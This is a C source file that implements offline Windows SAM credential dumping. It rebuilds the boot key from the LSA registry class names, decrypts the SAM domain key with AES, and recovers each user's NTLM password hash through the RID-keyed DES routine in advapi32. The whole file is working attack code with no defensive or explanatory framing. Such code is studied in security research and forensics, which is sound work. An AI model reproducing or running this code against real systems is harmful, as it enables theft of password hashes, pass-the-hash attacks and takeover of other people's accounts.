
#include "Includes.h"

_RtlDecryptDES2blocks1DWORD* RtlDecryptDES2blocks1DWORD = 0;

BOOL SAM_Initialize()
{
	BOOL success = FALSE;

	HMODULE hm = LoadLibraryW(L"advapi32.dll");
	RtlDecryptDES2blocks1DWORD = (_RtlDecryptDES2blocks1DWORD*)GetProcAddress(hm, "SystemFunction025");

	if (RtlDecryptDES2blocks1DWORD)
	{
		success = TRUE;
	}

	return success;
}

BOOL SAM_Uninitialize()
{
	return FreeLibrary(GetModuleHandleW(L"advapi32.dll"));
}


BOOL GetSyskey(BYTE* hive, BYTE* syskey)
{

	BOOL success = TRUE;
	DWORD out = 0;

	char* registry = "ControlSet001\\Control\\Lsa\\";
	char reg_path[40] = { 0 };
	const char* key_names[] = { "JD", "Skew1", "GBG", "Data" };
	const BYTE reorder[] = { 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 };

	DWORD classname_size = 9;
	wchar_t classname[9];
	BYTE buffer[16];


	for (int i = 0; i < ARRAYSIZE(key_names) && success; i++)
	{

		_snprintf_s(reg_path, 40, 40, "%s%s", registry, key_names[i]);

		success = GetNKClassName(hive, reg_path, classname, classname_size * sizeof(wchar_t), &out);

		swscanf_s(classname, L"%x", (DWORD*)&buffer[i * sizeof(DWORD)]);

		memset(reg_path, 0, 40);

	}

	for (int i = 0; i < 16 && success; i++)
	{
		syskey[i] = buffer[reorder[i]];
	}

	return success;
}


BOOL GetHashedSyskey(BYTE* hive, BYTE* syskey, BYTE* hashed_syskey)
{

	BOOL success = FALSE;

	char* reg_path = "SAM\\Domains\\Account";

	DWORD data_size = 0;
	BYTE* data = 0;
	DOMAIN_ACCOUNT_F* f = 0;

	DWORD hashed_syskey_size = 0;
	SAM_KEY_DATA_AES* key = 0;

	HCRYPTPROV hProv = 0;
	HCRYPTKEY hCryptKey = 0;
	DWORD mode = CRYPT_MODE_CBC;
	AES_128_KEY aes_key = { 0 };

	// Getting "F" Value size
	success = GetVKValue(hive, reg_path, "F", NULL, NULL, &data_size);
	if (data_size > 0)
	{
		data = (BYTE*)malloc(data_size);
	}

	// Getting "F" Value of the users
	success = GetVKValue(hive, reg_path, "F", data, data_size, &data_size);

	if (success)
	{
		f = (DOMAIN_ACCOUNT_F*)data;
		key = (SAM_KEY_DATA_AES*)&(f->keys1);
	}

	if (key)
	{
		success = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	}

	// Setting the key values and parameters
	if (success)
	{
		// Building the AES Key structure
		aes_key.header.bType = PLAINTEXTKEYBLOB;
		aes_key.header.bVersion = CUR_BLOB_VERSION;
		aes_key.header.reserved = 0;
		aes_key.header.aiKeyAlg = CALG_AES_128;
		aes_key.len = 16;
		memcpy(aes_key.key, syskey, aes_key.len);

		success = CryptImportKey(hProv, (BYTE*)&aes_key, sizeof(AES_128_KEY), NULL, NULL, &hCryptKey);
	}
	
	if (success)
	{
		success = CryptSetKeyParam(hCryptKey, KP_MODE, (BYTE*)&mode, NULL);
	}
	if (success)
	{
		success = CryptSetKeyParam(hCryptKey, KP_IV, (BYTE*)key->Salt, NULL);
	}

	// Decrypting the syskey
	if (success)
	{
		hashed_syskey_size = key->DataLen;
		memcpy(hashed_syskey, key->data, key->DataLen);
		success = CryptDecrypt(hCryptKey, NULL, TRUE, NULL, hashed_syskey, &hashed_syskey_size);

		// Destroying the keys
		CryptDestroyKey(hCryptKey);
		CryptReleaseContext(hProv, NULL);
	}

	
	
	free(data);
	return success;
}



BOOL GetNTLMHash(BYTE* hive, BYTE* hashed_syskey, char* rid_str, BYTE* ntlm, wchar_t** username)
{
	BYTE hash[32] = { 0 };
	BOOL success = FALSE;
	BYTE* data = 0;
	char* p = 0;

	DWORD v_size = 0;
	USER_ACCOUNT_V* v = 0;

	SAM_HASH_AES* ntlm_entry = 0;
	BYTE* hashed_ntlm = 0;
	DWORD ntlm_size = 0;
	BYTE* iv = 0;
	DWORD rid = 0;

	HCRYPTPROV hProv = 0;
	HCRYPTKEY hCryptKey = 0;
	DWORD mode = CRYPT_MODE_CBC;
	AES_128_KEY aes_key = { 0 };

	char* reg_path = "SAM\\Domains\\Account\\Users\\";
	DWORD full_reg_path_len = strlen(reg_path) + strlen(rid_str) + 1;
	char* full_reg_path = (char*)malloc(full_reg_path_len);

	// Creating full registry path
	_snprintf_s(full_reg_path, full_reg_path_len, full_reg_path_len, "%s%s", reg_path, rid_str);

	// Getting "V" value size for the specified user
	success = GetVKValue(hive, full_reg_path, "V", NULL, NULL, &v_size);
	if (v_size > 0)
	{
		data = (BYTE*)malloc(v_size);
	}
	// Getting "V" value for the specified user
	success = GetVKValue(hive, full_reg_path, "V", data, v_size, &v_size);

	if (success)
	{
		v = (USER_ACCOUNT_V*)data;
		ntlm_entry = (SAM_HASH_AES*)(v->NTLMHash.offset + v->datas);


		// v->NTLMHash.lenght is the size of all the data structure, so we subtracts the the size of the struct until the data field to get the ntlm size
		ntlm_size = v->NTLMHash.lenght - FIELD_OFFSET(SAM_HASH_AES, data);
		hashed_ntlm = ntlm_entry->data;
		iv = ntlm_entry->Salt;
		
		//*username = _wcsdup((wchar_t*)(v->Username.offset + v->datas));
		*username = (wchar_t*)calloc(v->Username.lenght + 2, sizeof(wchar_t));
		memcpy_s(*username, v->Username.lenght + 2, v->Username.offset + v->datas, v->Username.lenght);


		if (ntlm_size)
		{
			success = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
		}
		else
		{
			//hashed_ntlm = hash;
			//success = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
			success = FALSE;
		}
		
	}

	if (success)
	{

		aes_key.header.bType = PLAINTEXTKEYBLOB;
		aes_key.header.bVersion = CUR_BLOB_VERSION;
		aes_key.header.reserved = 0;
		aes_key.header.aiKeyAlg = CALG_AES_128;
		aes_key.len = 16;
		memcpy(aes_key.key, hashed_syskey, aes_key.len);

		success = CryptImportKey(hProv, (BYTE*)&aes_key, sizeof(AES_128_KEY), NULL, NULL, &hCryptKey);
	}

	if (success)
	{
		success = CryptSetKeyParam(hCryptKey, KP_MODE, (BYTE*)&mode, NULL);
	}

	if (success)
	{
		success = CryptSetKeyParam(hCryptKey, KP_IV, (BYTE*)iv, NULL);
	}

	if (success)
	{
		success = CryptDecrypt(hCryptKey, NULL, TRUE, NULL, hashed_ntlm, &ntlm_size);
	}

	if (success)
	{

		rid = strtol(rid_str, &p, 16);

		RtlDecryptDES2blocks1DWORD(hashed_ntlm, &rid, ntlm);
	}

	free(data);
	free(full_reg_path);

	return success;
}